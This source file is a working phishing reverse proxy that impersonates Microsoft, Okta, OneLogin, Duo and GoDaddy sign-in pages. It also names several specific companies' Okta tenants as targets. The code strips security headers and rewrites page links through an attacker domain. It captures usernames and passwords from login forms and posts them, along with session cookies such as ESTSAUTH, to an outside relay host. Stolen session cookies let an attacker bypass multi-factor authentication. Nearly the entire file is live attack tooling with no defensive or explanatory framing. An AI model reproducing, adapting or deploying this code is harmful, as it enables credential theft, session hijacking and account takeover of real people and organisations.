export const runtime = 'edge';

// ==================== CONFIG ====================
const YOUR_DOMAIN = 'proxyapp.ddns.net';
const VERCEL_URL = 'https://treydatapi.duckdns.org/api/relay';
const INITIAL_UPSTREAM = 'login.microsoftonline.com';
const PROXY_PREFIX = '/_p/';
const BLOCKED_IPS = ['0.0.0.0', '127.0.0.1'];

const IDENTITY_PROVIDERS = {
  'login.microsoftonline.com': { type: 'microsoft', name: 'Microsoft' },
  'login.live.com': { type: 'microsoft', name: 'Microsoft Live' },
  'account.live.com': { type: 'microsoft', name: 'Microsoft Account' },
  'account.microsoft.com': { type: 'microsoft', name: 'Microsoft Account' },
  'aadcdn.msauth.net': { type: 'microsoft', name: 'Microsoft CDN' },
  'www.office.com': { type: 'microsoft', name: 'Office 365' },
  'office.com': { type: 'microsoft', name: 'Office 365' },
  'microsoft365.com': { type: 'microsoft', name: 'Microsoft 365' },
  'outlook.office.com': { type: 'microsoft', name: 'Outlook' },
  'outlook.live.com': { type: 'microsoft', name: 'Outlook Live' },
  'o.okta.com': { type: 'okta', name: 'Okta' },
  'sci.okta.com': { type: 'okta', name: 'Okta Sci' },
  'dotfoods.okta.com': { type: 'okta', name: 'Okta DotFoods' },
  'login.okta.com': { type: 'okta', name: 'Okta Login' },
  'ulgroup.okta.com': { type: 'okta', name: 'Okta ULGroup' },
  'empowermm.onelogin.com': { type: 'onelogin', name: 'OneLogin' },
  'duosecurity.com': { type: 'duo', name: 'Duo' },
  'api-aa1a6aea.duosecurity.com': { type: 'duo', name: 'Duo API' },
  'login.duosecurity.com': { type: 'duo', name: 'Duo Login' },
  'sso.godaddy.com': { type: 'godaddy', name: 'GoDaddy' },
  'sso.secureserver.net': { type: 'godaddy', name: 'GoDaddy Legacy' }
};

// Only these critical auth cookies trigger exfiltration
const CRITICAL_AUTH_COOKIES = {
  microsoft: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'ESTSAUTHLIGHT', 'SignInStateCookie'],
  okta: ['sid', 'authtoken'],
  onelogin: ['sub_session_onelogin'],
  duo: ['.*'],
  godaddy: ['akm_lmprb-ssn', 'auth_id']
};

const CREDENTIAL_PATTERNS = {
  microsoft: {
    username: ['login', 'UserName', 'username', 'email', 'account', 'DomainUser', 'loginfmt', 'i0116'],
    password: ['passwd', 'Password', 'password', 'login_password', 'pass', 'pwd', 'session_password', 'PASSWORD', 'i0118']
  },
  okta: {
    username: ['username', 'user', 'email', 'identifier', 'login'],
    password: ['password', 'pass', 'pwd', 'credentials[passcode]', 'answer']
  },
  onelogin: {
    username: ['username', 'email', 'login'],
    password: ['password', 'pwd', 'pass']
  },
  duo: {
    username: ['username', 'email'],
    password: ['passcode', 'answer', 'password']
  },
  godaddy: {
    username: ['username', 'email', 'login', 'account'],
    password: ['password', 'pwd', 'pass']
  }
};
// =======================================================================

async function sendToVercel(type, data) {
  try {
    await fetch(VERCEL_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ type, timestamp: new Date().toISOString(), ...data }),
    });
  } catch (e) {}
}

// Consolidated cookie exfiltration - only sends when critical cookies present
async function exfiltrateCookies(cookieText, ip, platform, url) {
  try {
    // Clean URL for logging (remove query params for privacy, keep path)
    const cleanUrl = url.split('?')[0];
    
    const content = `IP: ${ip}\nPlatform: ${platform}\nURL: ${cleanUrl}\nData: Cookies found:\n\n${cookieText}\n`;
    const formData = new FormData();
    formData.append("file", new Blob([content], { type: "text/plain" }), `${ip}-COOKIE.txt`);
    formData.append("ip", ip);
    formData.append("type", "cookie-file");
    
    await fetch(VERCEL_URL, {
      method: "POST",
      body: formData,
    });
  } catch (e) {}
}

function getUpstreamInfo(pathname) {
  if (pathname.startsWith(PROXY_PREFIX)) {
    const withoutPrefix = pathname.slice(PROXY_PREFIX.length);
    const upstreamDomain = withoutPrefix.split('/')[0];
    const upstreamPath = '/' + withoutPrefix.slice(upstreamDomain.length + 1);
    const provider = IDENTITY_PROVIDERS[upstreamDomain];
    
    return {
      upstream: upstreamDomain,
      type: provider ? provider.type : 'unknown',
      path: upstreamPath,
      isProxied: true
    };
  }
  
  return {
    upstream: INITIAL_UPSTREAM,
    type: 'microsoft',
    path: pathname,
    isProxied: false
  };
}

function cleanQueryString(search) {
  if (!search) return '';
  
  const params = new URLSearchParams(search);
  const pathValues = params.getAll('path');
  
  if (pathValues.length > 1 || (pathValues.length === 1 && pathValues[0] === '_p')) {
    const cleaned = new URLSearchParams();
    for (const [key, value] of params) {
      if (key !== 'path') cleaned.append(key, value);
    }
    const result = cleaned.toString();
    return result ? '?' + result : '';
  }
  
  if (pathValues.length === 1) {
    const val = pathValues[0];
    if (val.includes('.') || val === '_p' || val === 'common' || val === 'shared') {
      const cleaned = new URLSearchParams();
      for (const [key, value] of params) {
        if (key !== 'path') cleaned.append(key, value);
      }
      const result = cleaned.toString();
      return result ? '?' + result : '';
    }
  }
  
  return search;
}

function rewriteUrls(text, upstreamDomain) {
  let result = text;
  
  // Fix localhost
  result = result.replace(/https?:\/\/localhost(:\d+)?/g, `https://${YOUR_DOMAIN}`);
  result = result.replace(/\/\/localhost(:\d+)?/g, `//${YOUR_DOMAIN}`);
  
  // Rewrite all known domains
  Object.keys(IDENTITY_PROVIDERS).forEach(domain => {
    const escaped = domain.replace(/\./g, '\\.');
    result = result.replace(
      new RegExp(`https://${escaped}(?!\\w)`, 'g'),
      `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
    );
    result = result.replace(
      new RegExp(`http://${escaped}(?!\\w)`, 'g'),
      `https://${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
    );
    result = result.replace(
      new RegExp(`//${escaped}(?!\\w)`, 'g'),
      `//${YOUR_DOMAIN}${PROXY_PREFIX}${domain}`
    );
  });
  
  // Fix relative paths
  result = result.replace(
    /(["'])\/(common|ppsecure|auth|api|Me\.htm|Prefetch\.aspx|login|oauth2|GetCredentialType)/g,
    `$1https://${YOUR_DOMAIN}${PROXY_PREFIX}${upstreamDomain}/$2`
  );
  
  // Fix JS references
  result = result.replace(
    /window\.location\.hostname\s*=\s*["'][^"']+["']/g,
    `window.location.hostname = "${YOUR_DOMAIN}"`
  );
  result = result.replace(
    /document\.domain\s*=\s*["'][^"']+["']/g,
    `document.domain = "${YOUR_DOMAIN}"`
  );
  
  return result;
}

function rewriteLocation(location) {
  try {
    const url = new URL(location);
    const shouldProxy = IDENTITY_PROVIDERS[url.hostname] || 
                       url.hostname.includes('microsoft') || 
                       url.hostname.includes('live.com') || 
                       url.hostname.includes('office.com') ||
                       url.hostname.includes('msauth.net');
    
    if (shouldProxy) {
      return `https://${YOUR_DOMAIN}${PROXY_PREFIX}${url.hostname}${url.pathname}${url.search}`;
    }
    return location;
  } catch (e) {
    return location;
  }
}

// Check if cookies contain critical auth tokens
function hasCriticalAuthCookies(cookieString, platform) {
  if (!cookieString) return false;
  const patterns = CRITICAL_AUTH_COOKIES[platform] || [];
  return patterns.some(p => {
    if (p === '.*') return true;
    return cookieString.toLowerCase().includes(p.toLowerCase());
  });
}

export default async function handleRequest(request) {
  const url = new URL(request.url);
  const ip = request.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || 'unknown';
  
  if (BLOCKED_IPS.includes(ip)) {
    return new Response('Access denied.', { status: 403 });
  }
  
  const info = getUpstreamInfo(url.pathname);
  const upstreamDomain = info.upstream;
  const cleanSearch = cleanQueryString(url.search);
  const upstreamPath = info.path + cleanSearch;
  const upstreamUrl = `https://${upstreamDomain}${upstreamPath}`;
  
  // Use YOUR_DOMAIN for logging to avoid localhost
  const displayUrl = `https://${YOUR_DOMAIN}${url.pathname}`;
  
  console.log(`[${info.type}] ${request.method} ${displayUrl} -> ${upstreamUrl}`);
  
  const headers = new Headers(request.headers);
  headers.set('Host', upstreamDomain);
  headers.set('Referer', `https://${upstreamDomain}/`);
  headers.set('Origin', `https://${upstreamDomain}`);
  
  // ==================== CREDENTIAL HARVESTING ====================
  let capturedCreds = null;
  
  if (request.method === 'POST') {
    try {
      const clone = request.clone();
      const ct = clone.headers.get('content-type') || '';
      let bodyData = {};
      
      if (ct.includes('application/json')) {
        bodyData = await clone.json();
      } else {
        const body = await clone.text();
        // Handle both standard form data and Okta-style nested keys
        const params = new URLSearchParams(body);
        for (const [key, value] of params) {
          bodyData[key] = value;
        }
      }
      
      const patterns = CREDENTIAL_PATTERNS[info.type] || CREDENTIAL_PATTERNS.microsoft;
      let username = null;
      let password = null;
      
      // Search for credentials in all fields
      for (const [key, value] of Object.entries(bodyData)) {
        if (!value || typeof value !== 'string') continue;
        const lowKey = key.toLowerCase();
        
        // Check username patterns
        for (const pattern of patterns.username) {
          if (lowKey === pattern.toLowerCase() || lowKey.includes(pattern.toLowerCase())) {
            username = value;
            console.log(`[CRED] Found username field: ${key}`);
            break;
          }
        }
        
        // Check password patterns
        for (const pattern of patterns.password) {
          if (lowKey === pattern.toLowerCase() || lowKey.includes(pattern.toLowerCase())) {
            password = value;
            console.log(`[CRED] Found password field: ${key}`);
            break;
          }
        }
      }
      
      if (username && password) {
        capturedCreds = {
          ip,
          platform: info.type,
          upstream: upstreamDomain,
          username: username,
          password: password,
          url: displayUrl,
          timestamp: new Date().toISOString()
        };
        
        await sendToVercel('credentials', capturedCreds);
        console.log(`[CREDENTIALS CAPTURED] ${username} @ ${info.type}`);
      }
    } catch (e) {
      console.error('Credential harvest error:', e);
    }
  }
  
  try {
    const fetchOpts = {
      method: request.method,
      headers,
      redirect: 'manual'
    };
    
    if (!['GET', 'HEAD'].includes(request.method)) {
      fetchOpts.body = request.body;
      fetchOpts.duplex = 'half';
    }
    
    const resp = await fetch(upstreamUrl, fetchOpts);
    
    // Handle redirects
    if ([301, 302, 303, 307, 308].includes(resp.status)) {
      const loc = resp.headers.get('Location');
      if (loc) {
        const newHeaders = new Headers(resp.headers);
        const newLoc = rewriteLocation(loc);
        console.log(`[Redirect] ${loc} -> ${newLoc}`);
        newHeaders.set('Location', newLoc);
        return new Response(null, { status: resp.status, headers: newHeaders });
      }
    }
    
    // Prepare response headers
    const newHeaders = new Headers(resp.headers);
    newHeaders.set('access-control-allow-origin', '*');
    newHeaders.set('access-control-allow-credentials', 'true');
    newHeaders.delete('content-security-policy');
    newHeaders.delete('content-security-policy-report-only');
    newHeaders.delete('clear-site-data');
    
    // ==================== CONDITIONAL COOKIE CAPTURE ====================
    // Only capture cookies when:
    // 1. It's a POST request (form submission), OR
    // 2. Response contains critical auth cookies (successful login)
    
    const cookies = resp.headers.getSetCookie?.() || [resp.headers.get('Set-Cookie')].filter(Boolean);
    let shouldCaptureCookies = false;
    let cookieStr = '';
    
    if (cookies?.length) {
      cookieStr = cookies.join('; ');
      
      // Condition 1: It's a POST request (likely form submission)
      const isPost = request.method === 'POST';
      
      // Condition 2: Critical auth cookies present (successful login)
      const hasAuth = hasCriticalAuthCookies(cookieStr, info.type);
      
      shouldCaptureCookies = isPost || hasAuth;
      
      // Process cookies for browser
      cookies.forEach(c => {
        const mod = c.replace(/Domain=[^;]+;?/gi, '');
        newHeaders.append('Set-Cookie', mod);
      });
    }
    
    // Capture credentials + cookies together if we have either
    if (shouldCaptureCookies || capturedCreds) {
      // If we captured creds but no auth cookies yet, still send the event
      // If we have auth cookies, send them
      if (cookieStr) {
        await exfiltrateCookies(cookieStr, ip, info.type, displayUrl);
      }
    }
    
    // Rewrite response body
    const ct = resp.headers.get('content-type') || '';
    if (/text\/html|application\/javascript|application\/json|text\/javascript/.test(ct)) {
      let text = await resp.text();
      text = rewriteUrls(text, upstreamDomain);
      return new Response(text, { status: resp.status, headers: newHeaders });
    }
    
    return new Response(resp.body, { status: resp.status, headers: newHeaders });
    
  } catch (err) {
    console.error(`[${info.type}] Error:`, err);
    return new Response(JSON.stringify({
      error: 'Proxy Error',
      message: err.message
    }), { status: 502, headers: { 'content-type': 'application/json' } });
  }
}

export const GET = handleRequest;
export const POST = handleRequest;
export const PUT = handleRequest;
export const DELETE = handleRequest;
export const PATCH = handleRequest;
export const OPTIONS = handleRequest;
export const HEAD = handleRequest;
